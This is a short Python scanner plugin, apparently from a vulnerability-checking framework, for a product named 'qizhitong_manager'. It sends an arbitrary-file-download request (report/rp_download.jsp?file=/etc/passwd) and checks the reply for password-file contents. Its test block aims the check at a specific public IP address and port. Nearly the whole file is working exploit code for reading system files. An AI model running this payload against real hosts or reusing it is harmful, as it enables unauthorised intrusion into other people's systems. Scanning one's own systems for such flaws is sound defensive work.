#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
	if service == 'qizhitong_manager':
		return True, arg

def audit(arg):
	payload = "report/rp_download.jsp?file=/etc/passwd&null=null"
	url = arg + payload
	code, head, body, errcode, _url = curl.curl2(url)
	if code == 200 and 'root' in body and '/bin/bash' in body:
		security_warning('Arbitrary file download:'+url)


if __name__ == '__main__':
	from dummy import *
	audit(assign('qizhitong_manager', 'http://183.63.91.226:8888/')[1])